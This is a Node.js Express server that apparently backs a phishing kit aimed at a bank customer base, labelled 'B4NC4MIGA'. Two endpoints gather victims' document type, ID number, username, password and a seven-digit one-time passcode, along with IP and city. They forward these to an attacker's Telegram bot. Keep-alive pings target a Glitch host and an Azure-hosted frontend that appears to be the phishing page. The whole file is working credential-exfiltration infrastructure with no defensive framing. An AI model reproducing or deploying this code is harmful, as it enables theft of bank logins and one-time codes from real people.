const express = require('express');
const bodyParser = require('body-parser');

const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const FormData = require("form-data");



app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));


app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, user1, user2, user3, ip, city } = req.body;

    if (!user || !user1 || !user2 || !user3 ||!ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔵B4NC4MIGA🔵\nTIP0: ${user}\nD0C: ${user1}\nUS4R: ${user2}\nCL4V: ${user3}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, user1, user2, user3, user4, user5, user6, user7, user8, user9, user10, ip, city } = req.body;

    if (!user || !user1 || !user2 || !user3 || !user4 || !user5 || !user6 || !user7 || !user8 || !user9 || !user10 || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔵B4NC4MIGA🔵\nTIP0: ${user}\nD0C: ${user1}\nUS4R: ${user2}\nCL4V: ${user3}\n\n0TP: ${user4}${user5}${user6}${user7}${user8}${user9}${user10}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});




const keepAliveUrl = 'https://silky-picturesque-caribou.glitch.me/';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 180000); // 180000 ms = 3 minutos


const FRONTEND_URL = "https://pruebitasdezoom.z13.web.core.windows.net/"; // Reemplaza con la URL de tu frontend

// Función para hacer ping al frontend cada 5 minutos
setInterval(() => {
    axios.get(FRONTEND_URL)
        .then(() => console.log(`Ping enviado a ${FRONTEND_URL}`))
        .catch(err => console.log("Error en el ping:", err.message));
}, 180000);



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
